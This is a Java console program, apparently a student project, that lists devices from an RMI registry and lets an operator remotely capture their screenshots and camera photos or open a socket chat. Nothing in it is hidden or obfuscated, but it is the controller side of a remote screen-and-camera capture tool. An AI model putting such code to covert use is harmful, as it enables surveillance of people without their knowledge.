package Manager;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.text.SimpleDateFormat;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import Central.CentralRegistry;
import Device.Device;

import java.io.File;
import java.util.Base64;
import java.util.Date;
import java.util.List;

public class ManagerApp {
    private static BufferedReader scanner = new BufferedReader(new InputStreamReader(System.in));
    
    private static final String CENTRAL_REGISTRY_IP = "localhost";
    private static final Integer CENTRAL_REGISTRY_PORT = 1099;
    private static final String CENTRAL_REGISTRY_NAME = "CentralRegistry";

    public static void main(String[] args) throws IOException, NotBoundException {
        while (true) {
            // Display available devices
            displayDevices();

            // Choose a device
            System.out.print("\nEnter the number of the device to interact with (or 0 to refresh the list): ");
       

            String input = scanner.readLine();

            // Parse the string input to an integer
            int selectedDeviceNumber = Integer.parseInt(input);
    

            if (selectedDeviceNumber == 0) continue;

            Device device = getDeviceIpByNumber(selectedDeviceNumber);
            
            // Connect to selected device
            try {

                boolean backToDeviceList = false;
                while (!backToDeviceList) {
                    // Choose action
                    System.out.println("\nChoose an action for the selected device:");
                    System.out.println("1. Capture Screenshot");
                    System.out.println("2. Take a photo");
                    System.out.println("3. Start Chat");
                    System.out.println("4. Back to Device List");
                    System.out.print("Enter the number of the action: ");
                  
                    String input2 = scanner.readLine();

                    // Parse the string input to an integer
                    int selectedAction = Integer.parseInt(input2);
                    // Perform action
                    switch (selectedAction) {
                        case 1:
                            String screenshot = device.captureScreenshot();
                            saveImageToFile(screenshot, "screenshots");
                            System.out.println("Screenshot captured and saved successfully.");
                            break;
                        case 2:
                            String photo = device.captureImage();
                            saveImageToFile(photo, "photos");
                            System.out.println("Photo captured and saved successfully.");
                            break;
                        case 3:
                            startChatWithDevice(device);
                        

                            break;
                        case 4:
                            backToDeviceList = true;
                            break;
                        default:
                            System.out.println("Invalid action number.");
                    }
                }
            } catch (Exception e) {
                System.err.println("Manager exception: " + e.toString());
                e.printStackTrace();
            }
        }
    }

    private static void displayDevices() {

        try {
            Registry registry = LocateRegistry.getRegistry(CENTRAL_REGISTRY_IP, CENTRAL_REGISTRY_PORT);
            CentralRegistry centralRegistry = (CentralRegistry) registry.lookup(CENTRAL_REGISTRY_NAME);
            List<String> activeClients = centralRegistry.getActiveClients();
            int deviceCount = 0;
            for (String clientName : activeClients) {
                deviceCount++;
                String clientRegistryURL = centralRegistry.getClientRegistryURL(clientName);
                System.out.println(deviceCount + ": " + clientName + " at " + clientRegistryURL);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static Device getDeviceIpByNumber(int number) throws IOException, NotBoundException {
       
            Registry registry = LocateRegistry.getRegistry(CENTRAL_REGISTRY_IP, CENTRAL_REGISTRY_PORT);
            CentralRegistry centralRegistry = (CentralRegistry) registry.lookup(CENTRAL_REGISTRY_NAME);
            List<String> activeClients = centralRegistry.getActiveClients();
            int currentNumber = 0;
            for (String clientName : activeClients) {
                currentNumber++;
                
                
                if (currentNumber == number) {
                    String ip = centralRegistry.getClientRegistryURL(clientName);

                     // Split the string by the colon character ":"
                    String[] parts = ip.split(":");
                    
                    
                    // Extract the IP address and port number
                    String ipAddress = parts[0];
                    Integer portNumber = Integer.parseInt(parts[1]);
                    System.out.println(ipAddress+" " + portNumber);
                    Registry deviceRegistry = LocateRegistry.getRegistry(ipAddress, portNumber);
                    Device device = (Device) deviceRegistry.lookup(clientName);
                    
                    return device;
                }
            }
            throw new IllegalArgumentException("Device not found for number: " + number);
    }

    private static void saveImageToFile(String screenshotBase64, String path) {
        try {
            byte[] screenshotBytes = Base64.getDecoder().decode(screenshotBase64);
            BufferedImage screenshot = ImageIO.read(new ByteArrayInputStream(screenshotBytes));

            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            File outputFile = new File("Manager/"+path + "/" + timeStamp + ".png");
            ImageIO.write(screenshot, "png", outputFile);
        } catch (IOException e) {
            System.err.println("Error saving image: " + e.getMessage());
        }
    }

    private static void startChatWithDevice(Device device) {
        try (ServerSocket serverSocket = new ServerSocket(8080)) {
            System.out.println("Server started. Waiting for clients to connect...");

            // Start the device chat
            device.startChat();

            try (Socket clientSocket = serverSocket.accept()) {
                System.out.println("Client connected.");

                Socket finalClientSocket = clientSocket;
                Thread consoleThread = new Thread(() -> {
                    try (
                         PrintWriter writer = new PrintWriter(finalClientSocket.getOutputStream(), true)) {
                        String inputLine;
                        while ((inputLine = scanner.readLine()) != null) {
                            if (inputLine.equals("exit")) {
                                System.out.println("Exiting chat...");
                                serverSocket.close();

                            break;
                            }
                            writer.println(inputLine);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                });

                Thread clientThread = new Thread(() -> {
                    try (BufferedReader clientReader = new BufferedReader(new InputStreamReader(finalClientSocket.getInputStream()))) {
                        String clientMessage;
                        while ((clientMessage = clientReader.readLine()) != null) {
                            System.out.println("Client: " + clientMessage);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                });

                consoleThread.start();
                clientThread.start();

                consoleThread.join();
                clientThread.join();
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
